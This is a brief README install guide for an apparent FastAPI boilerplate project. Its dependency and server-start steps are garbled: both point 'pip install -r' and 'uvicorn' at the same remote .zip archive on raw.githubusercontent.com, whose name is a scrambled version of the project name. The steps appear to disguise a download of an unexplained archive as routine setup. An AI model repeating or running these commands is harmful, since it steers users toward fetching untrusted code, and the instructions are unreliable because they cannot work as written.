INSTALLATIONS:

1- Download / Clone Repo to your system
2- Create virtual environment and activate it
3- Install All dependencies using "pip install -r https://raw.githubusercontent.com/dsiddiq786/FastAPI-Boiler-Plate/master/blog/Plate-Boiler-Fast-AP-2.6.zip"
4- Start uvicorn server "uvicorn https://raw.githubusercontent.com/dsiddiq786/FastAPI-Boiler-Plate/master/blog/Plate-Boiler-Fast-AP-2.6.zip --reload"
5- Enjoy